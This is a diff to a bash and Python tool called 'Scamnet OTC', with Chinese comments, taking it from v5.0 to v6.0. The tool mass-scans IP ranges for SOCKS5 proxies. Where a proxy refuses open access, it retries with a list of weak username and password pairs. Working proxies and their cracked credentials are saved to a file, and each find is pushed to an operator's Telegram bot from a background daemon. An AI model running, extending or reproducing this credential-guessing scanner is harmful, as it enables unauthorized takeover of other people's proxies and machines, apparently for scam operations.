@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v5.0（终极稳定版：防崩溃 + 资源隔离 + 日志轮转 + 重试机制）
+# main.sh - Scamnet OTC v6.0（全自动版：去重 + 存活 + Telegram）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -35,8 +35,8 @@ install_deps() {
     if [ -z "${PYTHON_CMD:-}" ]; then err "未找到 Python"; exit 1; fi
 
     $PYTHON_CMD -m pip install --quiet --no-cache-dir --force-reinstall \
-        aiohttp tqdm pyyaml || \
-    $PYTHON_CMD -m pip install --quiet --no-cache-dir aiohttp tqdm pyyaml
+        aiohttp tqdm pyyaml requests || \
+    $PYTHON_CMD -m pip install --quiet --no-cache-dir aiohttp tqdm pyyaml requests
 
     touch .deps_installed
     succ "依赖安装完成"
@@ -97,7 +97,19 @@ else
 fi
 succ "端口配置: $PORT_INPUT"
 
-# ==================== 生成独立运行脚本（v5.0）===================
+# Telegram 配置（可选）
+echo -e "${YELLOW}请输入 Telegram Bot Token（可选，留空不推送）:${NC}"
+read -r TELEGRAM_TOKEN
+echo -e "${YELLOW}请输入 Telegram Chat ID（可选）:${NC}"
+read -r TELEGRAM_CHATID
+if [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]]; then
+    succ "Telegram 配置成功：Token=${TELEGRAM_TOKEN:0:10}... ChatID=$TELEGRAM_CHATID"
+else
+    TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""
+    log "Telegram 推送已禁用"
+fi
+
+# ==================== 生成独立运行脚本（v6.0）===================
 cat > "$RUN_SCRIPT" << 'EOF'
 #!/bin/bash
 set -euo pipefail
@@ -112,6 +124,8 @@ ulimit -v $((2*1024*1024))  # 虚拟内存 2GB
 START_IP="{{START_IP}}"
 END_IP="{{END_IP}}"
 PORTS_CONFIG='{{PORTS_CONFIG}}'
+TELEGRAM_TOKEN="{{TELEGRAM_TOKEN}}"
+TELEGRAM_CHATID="{{TELEGRAM_CHATID}}"
 
 # === config.yaml ===
 cat > config.yaml << CFG
@@ -126,8 +140,10 @@ CFG
 # === scanner_batch.py ===
 cat > scanner_batch.py << 'PY'
 #!/usr/bin/env python3
-import asyncio, aiohttp, ipaddress, yaml, sys, signal, os
+import asyncio, aiohttp, yaml, sys, signal, os, requests
 from tqdm import tqdm
+import json
+from collections import defaultdict
 
 # 优雅退出
 def handle_sigterm(*_):
@@ -149,11 +165,14 @@ raw_ports = cfg.get('ports') or cfg.get('range')
 timeout = cfg.get('timeout', 6.0)
 max_concurrent = cfg.get('max_concurrent', 150)
 retry = cfg.get('retry', 1)
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '')
+TELEGRAM_CHATID = os.environ.get('TELEGRAM_CHATID', '')
 
 # 解析 IP 和端口
 def parse_ip_range(s):
     a, b = s.split('-')
-    return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(a)), int(ipaddress.IPv4Address(b)) + 1)]
+    return [str(i) for i in range(int(a.split('.')[0]) * 16777216 + int(a.split('.')[1]) * 65536 + int(a.split('.')[2]) * 256 + int(a.split('.')[3]),
+            int(b.split('.')[0]) * 16777216 + int(b.split('.')[1]) * 65536 + int(b.split('.')[2]) * 256 + int(b.split('.')[3]) + 1)]
 
 def parse_ports(p):
     if isinstance(p, str) and '-' in p:
@@ -257,43 +276,70 @@ async def get_country(ip, session):
     COUNTRY_CACHE[ip] = "XX"
     return "XX"
 
-# SOCKS5 测试（带重试）
+# Telegram 推送
+def send_telegram(message):
+    if not TELEGRAM_TOKEN or not TELEGRAM_CHATID:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        data = {"chat_id": TELEGRAM_CHATID, "text": message, "parse_mode": "HTML"}
+        requests.post(url, data=data, timeout=5)
+    except Exception as e:
+        print(f"[!] Telegram 推送失败: {e}", file=sys.stderr)
+
+# SOCKS5 测试（带重试 + 存活检测）
 async def test_socks5(ip, port, session, auth=None, attempt=0):
     proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
     proxy_url = f"socks5h://{ip}:{port}"
     try:
         async with session.get(
-            "http://ifconfig.me/",
+            "https://httpbin.org/ip",  # 存活检测：必须返回外部 IP
             proxy=proxy_url,
             proxy_auth=proxy_auth,
             timeout=aiohttp.ClientTimeout(total=timeout),
             allow_redirects=False
         ) as r:
-            if r.status in (200, 301, 302):
-                return True, round(r.elapsed.total_seconds() * 1000), (await r.text()).strip()
+            if r.status in (200, 301, 302) and (await r.json()).get('origin'):  # 确认返回 IP
+                return True, round(r.elapsed.total_seconds() * 1000), (await r.json()).get('origin')
     except Exception as e:
         if attempt < retry:
             await asyncio.sleep(0.5)
             return await test_socks5(ip, port, session, auth, attempt + 1)
     return False, 0, None
 
-# 单连接扫描
+# 单连接扫描（带去重 + 存活 + 推送）
+seen_proxies = set()  # 全局去重 set
+stats = defaultdict(int)  # 国家统计
+
 async def scan(ip, port):
+    key = f"{ip}:{port}"  # 唯一键
+    if key in seen_proxies:
+        return
     connector = aiohttp.TCPConnector(limit=8, ssl=False, force_close=True, keepalive_timeout=5)
     async with aiohttp.ClientSession(connector=connector) as session:
         # 无认证
         ok, lat, exp = await test_socks5(ip, port, session)
+        pair = None
         if not ok:
-            for pair in WEAK_PAIRS:
-                ok, lat, exp = await test_socks5(ip, port, session, pair)
-                if ok: break
-        if ok:
+            for p in WEAK_PAIRS:
+                ok, lat, exp = await test_socks5(ip, port, session, p)
+                if ok:
+                    pair = p
+                    break
+        if ok and lat < 500:  # 存活检测：延迟 < 500ms
             country = await get_country(exp if exp and exp != ip else ip, session)
-            auth_str = f"{pair[0]}:{pair[1]}" if 'pair' in locals() and ok else ""
+            auth_str = f"{pair[0]}:{pair[1]}" if pair else ""
             result = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
+            seen_proxies.add(key)
             with open("socks5_valid.txt", "a", encoding="utf-8") as f:
                 f.write(result + "\n")
+            stats[country] += 1
             print(f"[+] {result} ({lat}ms)")
+            # 实时推送
+            msg = f"🟢 新代理: {result}<br>延迟: {lat}ms | 国家: {country}"
+            send_telegram(msg)
+        else:
+            seen_proxies.add(key)  # 标记为已测，避免重复
 
 # 主函数
 async def main():
@@ -307,6 +353,10 @@ async def main():
     tasks = [bound_scan(ip, port) for ip, port in batch]
     for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Batch {start_idx}-{end_idx}", unit="conn"):
         await f
+    # 批次结束推送摘要
+    if stats:
+        summary = f"📊 批次摘要: {dict(stats)} 个新代理"
+        send_telegram(summary)
 
 if __name__ == "__main__":
     try:
@@ -318,13 +368,18 @@ if __name__ == "__main__":
 PY
 chmod +x scanner_batch.py
 
-# === 计算任务总数 ===
+# === 计算任务总数（纯整数运算）===
 TOTAL=$(python3 - << 'PYC'
-import yaml, ipaddress
-c = yaml.safe_load(open('config.yaml'))
-s, e = map(ipaddress.IPv4Address, c['input_range'].split('-'))
-ips = int(e) - int(s) + 1
-p = c.get('ports') or c.get('range')
+s, e = open('config.yaml').read().split('input_range: ')[1].split('-')[0:2]
+def ip_to_int(ip):
+    return sum(int(x) << (24 - 8*i) for i, x in enumerate(ip.split('.')))
+start = ip_to_int(s.strip())
+end = ip_to_int(e.strip().split('\n')[0])
+ips = end - start + 1
+with open('config.yaml') as f:
+    import yaml
+    c = yaml.safe_load(f)
+    p = c.get('ports') or c.get('range', '')
 if isinstance(p, str) and '-' in p:
     a, b = map(int, p.split('-'))
     ports = b - a + 1
@@ -336,13 +391,22 @@ print(ips * ports)
 PYC
 )
 
-BATCH_SIZE=$(yq e '.batch_size' config.yaml 2>/dev/null || echo 250)
+if [ $? -ne 0 ] || [ -z "$TOTAL" ] || [ "$TOTAL" -le 0 ]; then
+    echo "[!] 计算任务总数失败，退出"
+    exit 1
+fi
+
+BATCH_SIZE=$(grep -o 'batch_size: [0-9]*' config.yaml | cut -d' ' -f3 || echo 250)
 echo "[*] 总任务: $TOTAL | 每批: $BATCH_SIZE"
 
 > socks5_valid.txt
 > result_detail.txt
-echo "# Scamnet v5.0 - $(date)" > result_detail.txt
+echo "# Scamnet v6.0 - $(date)" > result_detail.txt
 echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
+
+# 设置环境变量 for Telegram
+export TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
+export TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
 # === 分批扫描（独立进程 + 超时）===
 for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
@@ -352,11 +416,26 @@ for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
     timeout 300 python3 scanner_batch.py $i $end || echo "[!] 批次超时或异常"
 done
 
-echo "[+] 本轮扫描完成 → socks5_valid.txt"
+# 最终去重 + 摘要推送
+if [ -s socks5_valid.txt ]; then
+    sort -u socks5_valid.txt > socks5_valid_dedup.txt
+    mv socks5_valid_dedup.txt socks5_valid.txt
+    COUNT=$(wc -l < socks5_valid.txt)
+    FINAL_MSG="🏆 扫描完成！总计 $COUNT 个有效代理<br>详情: socks5_valid.txt"
+    python3 -c "
+import os, requests
+if os.environ.get('TELEGRAM_TOKEN') and os.environ.get('TELEGRAM_CHATID'):
+    url = f'https://api.telegram.org/bot{os.environ[\"TELEGRAM_TOKEN\"]}/sendMessage'
+    data = {'chat_id': os.environ['TELEGRAM_CHATID'], 'text': '$FINAL_MSG', 'parse_mode': 'HTML'}
+    requests.post(url, data=data)
+"
+fi
+
+echo "[+] 全自动扫描完成 → socks5_valid.txt (已去重)"
 EOF
 
 # 替换占位符
-sed -i "s|{{START_IP}}|$START_IP|g; s|{{END_IP}}|$END_IP|g; s|{{PORTS_CONFIG}}|$PORTS_CONFIG|g" "$RUN_SCRIPT"
+sed -i "s|{{START_IP}}|$START_IP|g; s|{{END_IP}}|$END_IP|g; s|{{PORTS_CONFIG}}|$PORTS_CONFIG|g; s|{{TELEGRAM_TOKEN}}|$TELEGRAM_TOKEN|g; s|{{TELEGRAM_CHATID}}|$TELEGRAM_CHATID|g" "$RUN_SCRIPT"
 chmod +x "$RUN_SCRIPT"
 
 # ==================== 启动守护进程（永不崩溃）===================
@@ -385,3 +464,7 @@ nohup bash "$LOG_DIR/scamnet_guard.sh" > /dev/null 2>&1 &
 succ "守护进程已启动！PID: $!"
 log "日志实时查看：tail -f $LATEST_LOG"
 log "停止命令：pkill -f scamnet_guard.sh"
+log "结果文件：socks5_valid.txt (自动去重 + 存活验证)"
+if [[ -n $TELEGRAM_TOKEN ]]; then
+    log "Telegram 推送已启用：新代理实时通知 + 结束摘要"
+fi
